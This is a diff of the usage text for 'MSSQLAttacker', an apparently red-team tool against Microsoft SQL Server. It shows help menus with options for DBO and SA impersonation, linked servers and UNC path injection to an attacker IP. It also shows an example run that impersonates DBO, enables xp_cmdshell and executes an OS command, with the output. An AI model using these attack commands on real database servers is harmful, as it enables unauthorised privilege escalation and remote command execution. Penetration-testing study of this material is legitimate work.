@@ -14,7 +14,6 @@ Z:\>MSSQLAttacker.exe
                 HELP MENU
  USAGE: binary.exe GUI DatabaseServer DatabaseName [Optional] Username [Optional] Password
  USAGE: binary.exe GUI dc01.corp1.com masters SA SecretPassword
- 
 [*] MSSQL Attacker - V1 by Rikunj Sindhwad [CLI MODE] [*]
                 HELP MENU
  USAGE: binary.exe cli -a AttackName -t DatabaseServer -d DatabaseName
@@ -24,7 +23,7 @@ Z:\>MSSQLAttacker.exe
  -d                     Target DatabaseName
  -u                     Target Username [Optional]
  -p                     Target Password [Optional]
- -dbo                   DatabaseNmae for DBO impersonation
+ -dbo                   DatabaseNmae for DBO impersonation [Optional]
  -ls                    Linked MSSQLServer Name
  -l                     Attacker IP for UNC Path Injection
  -impersonateSA         ImpersonateSA before execution of any attack
@@ -278,8 +277,10 @@ corp1\sqlsvc
 # with impersonateDBO
 Z:\>MSSQLAttacker.exe cli -t dc01.corp1.com -d master -a execcmd  -impersonateDBO -dbo msdb -c ipconfig
 [+] Auth success!
+[+] Found Trustworthy Database
 [+] Impersonation As DBO Success
-[+] xp_cmdshell enabled
+[+] Value In Use: 1
+[+] xp_cmdshell is enabled
 
 Windows IP Configuration
 
